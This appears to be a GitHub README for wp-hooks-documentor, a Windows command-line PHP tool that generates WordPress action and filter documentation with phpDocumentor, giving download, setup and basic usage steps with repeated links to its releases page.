# 🛠️ wp-hooks-documentor - Create WordPress Hook Docs Easily

[![Download wp-hooks-documentor](https://img.shields.io/badge/Download-wp--hooks--documentor-ff69b4?style=for-the-badge)](https://github.com/plkarjun/wp-hooks-documentor/releases)

---

## 🔍 What is wp-hooks-documentor?

wp-hooks-documentor is a command-line tool that helps you create documentation for WordPress hooks. It uses phpDocumentor, a popular PHP documentation generator, to produce easy-to-read docs for WordPress actions and filters. This tool is designed to make managing and understanding WordPress hooks simpler.

You don’t need to know coding to use it. It works behind the scenes to make hook information clear and organized.

---

## 💻 System Requirements

- Windows 10 or newer
- PHP installed (version 7.4 or higher)
- Basic comfort with running programs from the command line (we will guide you)
- At least 200 MB free disk space

The tool is built to run on Windows systems. Make sure you have PHP installed before starting. If you do not have PHP on your computer, visit https://windows.php.net/download/ to download and install it first.

---

## 🚀 Getting Started

### Step 1: Download wp-hooks-documentor

Visit the release page to get the latest version of the program:

[Download wp-hooks-documentor from Releases](https://github.com/plkarjun/wp-hooks-documentor/releases)

Click this link, find the latest release version, and download the ZIP file or executable file provided.

---

### Step 2: Extract the Files

- If you downloaded a ZIP file, right-click the file and choose "Extract All."
- Follow the instructions to extract the contents to a folder you can find easily, such as your Desktop or Documents folder.

---

### Step 3: Open Command Prompt

- Press the Windows key, type `cmd`, and press Enter. This opens the command prompt window.
- Use the command prompt to navigate to the folder where you extracted wp-hooks-documentor.

Example:

```bash
cd C:\Users\YourName\Desktop\wp-hooks-documentor
```

Replace `YourName` with your Windows user name or change the path to where you saved the files.

---

### Step 4: Run the Tool

Type the following command in the window and press Enter:

```bash
php wp-hooks-documentor.php --help
```

This command shows guidance on how to use the tool. You will see options to generate documentation for WordPress hooks based on your settings.

---

## 📥 How to Download and Install

1. Go to the release page here:

[https://github.com/plkarjun/wp-hooks-documentor/releases](https://github.com/plkarjun/wp-hooks-documentor/releases)

2. Find the latest version. Look for a file named similar to `wp-hooks-documentor.zip` or `wp-hooks-documentor.exe`.
3. Click the file name to start downloading.
4. If it’s a ZIP file, extract it to a folder you can find.
5. Open Command Prompt and move to the extracted folder.
6. Run the program by typing:

```bash
php wp-hooks-documentor.php --help
```

---

## 📝 What Does The Tool Do?

- It scans your WordPress code for hooks. Hooks are special points in the code where developers can add custom code.
- It reads docblocks (notes or comments in the code) attached to these hooks.
- It creates clear documentation from these comments, so it is easy for you or your team to see what each hook does and how to use it.
- Supports both Actions and Filters, two types of WordPress hooks.
- Helps with organizing and maintaining plugin or theme development.

---

## 🔧 How to Use wp-hooks-documentor

The tool runs in a command-line window with simple commands.

Basic usage example:

```bash
php wp-hooks-documentor.php --source=path-to-your-wordpress-plugin --output=docs-folder
```

- Replace `path-to-your-wordpress-plugin` with the folder path of the code you want to document.
- Replace `docs-folder` with where you want the documentation files to be saved.

You can add more options. Use the `--help` command to see all commands:

```bash
php wp-hooks-documentor.php --help
```

---

## 📂 Where to Find Documentation Output

By default, the output will be a set of HTML files. You can open these files in any web browser. This makes it easy to read the documentation on your computer or share it with others.

---

## ⚙️ Additional Tips

- Make sure PHP is properly installed and added to your Windows system PATH to run the `php` command from anywhere.
- Keep your WordPress hooks commented fully using standard PHP docblock style. This improves the quality of generated documentation.
- Check the GitHub releases page regularly to download updates.

---

## ❓ Troubleshooting

- If `php` command is not recognized, make sure PHP is installed and added to your PATH.
- If you get errors opening the documentation, ensure you used the correct output folder.
- If you don’t see any documentation, verify your source path contains WordPress hooks with proper docblocks.

---

## 🧰 Common Terms

- **WordPress Hooks:** Points in WordPress where you can run custom code.
- **Actions:** Hooks that run at specific times in WordPress.
- **Filters:** Hooks that modify data before saving or displaying.
- **Docblock:** Comments in code that explain what functions or hooks do.
- **phpDocumentor:** Tool that reads docblocks and turns them into documents.

---

## 🔗 Useful Links

- Download Latest Release: [https://github.com/plkarjun/wp-hooks-documentor/releases](https://github.com/plkarjun/wp-hooks-documentor/releases)
- PHP for Windows: https://windows.php.net/download/
- WordPress Developer Code Reference: https://developer.wordpress.org/reference/

[![Download wp-hooks-documentor](https://img.shields.io/badge/Download-wp--hooks--documentor-ff69b4?style=for-the-badge)](https://github.com/plkarjun/wp-hooks-documentor/releases)